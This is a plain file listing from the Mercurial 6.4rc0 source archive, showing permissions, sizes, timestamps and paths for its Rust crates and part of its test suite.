+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4912 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/copy_tracing/tests.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5272 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/copy_tracing/tests_support.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22992 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/copy_tracing.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9183 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dagops.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/src/dirstate/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13187 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate/dirs_multiset.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23661 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate/entry.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4230 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate/parsers.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4905 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate/status.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1124 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    67100 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/dirstate_map.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    28509 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/on_disk.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2558 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/owning.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5821 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/path_with_basename.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    38403 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/status.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       99 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/dirstate_tree.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23458 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/discovery.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7336 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/errors.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      762 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/exit_codes.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24355 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/filepatterns.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4126 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/lib.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6596 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/lock.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3636 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/logging.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    55223 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/matchers.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3663 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/narrow.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/src/operations/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3364 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/operations/cat.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1080 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/operations/debugdata.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1256 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/operations/list_tracked_files.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      409 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/operations/mod.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26827 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/repo.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6518 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/requirements.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/src/revlog/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8676 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/changelog.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7553 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/filelog.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17658 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/index.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6653 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/manifest.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22422 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/mod.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13553 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/node.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    35756 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/nodemap.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3648 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/nodemap_docket.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12050 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/patch.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18248 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revlog/path_encode.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2139 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/revset.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10371 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/sparse.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1769 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/testing.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/src/utils/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3045 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/utils/debug.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13256 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/utils/files.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25568 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/utils/hg_path.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7801 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/utils/path_auditor.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14848 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/utils.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6162 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/vfs.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/tests/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11317 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/tests/test_missing_ancestors.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-cpython/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      404 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/Cargo.toml
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-cpython/src/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8565 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/ancestors.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7156 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/cindex.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1016 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/conversion.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7114 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/copy_tracing.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2410 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/dagops.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      822 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/debug.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-cpython/src/dirstate/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3383 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/dirstate/copymap.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3741 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/dirstate/dirs_multiset.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18684 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/dirstate/dirstate_map.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6905 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/dirstate/item.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10077 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/dirstate/status.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2013 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/dirstate.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5795 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/discovery.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2332 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/exceptions.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2377 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/lib.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1590 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/pybytes_deref.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4126 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/ref_sharing.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17409 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/revlog.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1481 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-cpython/src/utils.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hgcli/
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hgcli/.cargo/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      671 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hgcli/.cargo/config
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23621 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hgcli/Cargo.lock
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      819 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hgcli/Cargo.toml
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1958 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hgcli/README.md
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      577 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hgcli/build.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11709 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hgcli/pyoxidizer.bzl
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hgcli/src/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1484 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hgcli/src/main.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/rhg/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      516 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/Cargo.toml
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1741 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/README.md
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/rhg/src/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5429 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/blackbox.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7501 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/color.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/rhg/src/commands/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4086 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/commands/cat.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1059 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/commands/config.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2059 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/commands/debugdata.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1036 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/commands/debugignorerhg.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      598 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/commands/debugrequirements.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1491 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/commands/debugrhgsparse.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3149 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/commands/files.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      862 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/commands/root.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21984 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/commands/status.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9491 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/error.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27986 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/main.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8975 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/ui.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/rhg/src/utils/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1756 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/rhg/src/utils/path_utils.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       83 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rustfmt.toml
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       38 2023-03-02 22:30:09.278632 mercurial-6.4rc0/setup.cfg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    59222 2023-03-02 22:29:51.000000 mercurial-6.4rc0/setup.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.274632 mercurial-6.4rc0/tests/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      556 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/.balto.toml
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      141 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/README
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.274632 mercurial-6.4rc0/tests/artifacts/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      396 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/artifacts/PURPOSE
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.274632 mercurial-6.4rc0/tests/artifacts/cache/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       33 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/artifacts/cache/big-file-churn.hg.md5
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.274632 mercurial-6.4rc0/tests/artifacts/scripts/
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4407 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/artifacts/scripts/generate-churning-bundle.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1558 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/autodiff.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1523 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/basic_test_result.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      593 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/binfile.bin
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1103 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/blackbox-readonly-dispatch.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.274632 mercurial-6.4rc0/tests/blacklists/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      516 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/blacklists/README
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      992 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/blacklists/fsmonitor
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      443 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/blacklists/linux-vfat
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2242 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bruterebase.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.274632 mercurial-6.4rc0/tests/bundles/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1314 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/darcs1.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10686 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/hgweb+obs.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2216 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/issue4041.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4151 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/issue4438-r1.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3864 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/issue4438-r2.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2223 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/issue6528.hg-v1
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2406 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/issue6528.hg-v2
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    61440 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/issue6528.tar
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      548 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/legacy-encoding.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1844 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/rebase-revset.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1663 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/rebase.hg
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      484 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/rebase.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1768 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/remote.hg
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      520 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/remote.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      346 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/rename.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1600 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/renames.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1171 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/tampered.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      847 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/test-invalid-branch-name.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      302 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/test-keyword.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      596 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/test-manifest.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      947 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/test-merge-symlinks.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      558 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/test-no-symlinks.hg
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1175 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/test-revlog-diff-relative-to-nullrev.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30720 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bundles/test-revlog-diff-relative-to-nullrev.tar
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      379 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/bzr-definitions
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1751 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/cgienv
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      343 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/check-gendoc
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2649 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/check-perf-code.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7216 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/common-pattern.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      247 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/crashgetbundler.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13103 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/drawdag.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2723 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/dumbhttp.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3302 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/dummysmtpd.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      893 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/dummyssh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     7306 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/f
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      281 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/failfilemerge.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3043 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/fakedirstatewritetime.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      763 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/fakemergerecord.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1197 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/fakepatchtime.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      837 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/filterpyflakes.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1004 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/filtertraceback.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3850 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/flagprocessorext.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4760 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/fsmonitor-run-tests.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3417 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/generate-working-copy-states.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3624 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/get-with-headers.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.274632 mercurial-6.4rc0/tests/gpg/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      597 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/gpg/pubring.gpg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1248 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/gpg/secring.gpg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1280 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/gpg/trustdb.gpg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       71 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/helper-killhook.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      122 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/helper-runtests.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1975 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/helpers-testrepo.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      592 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/heredoctest.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1807 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/hghave
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30375 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/hghave.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1288 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/hgterm.ti
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      712 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/hgweberror.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      229 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/histedit-helpers.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3863 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/httpserverauth.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2172 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/hypothesishelpers.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4279 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/killdaemons.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      551 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/library-infinitepush.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      617 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/list-tree.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      641 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/lockdelay.py
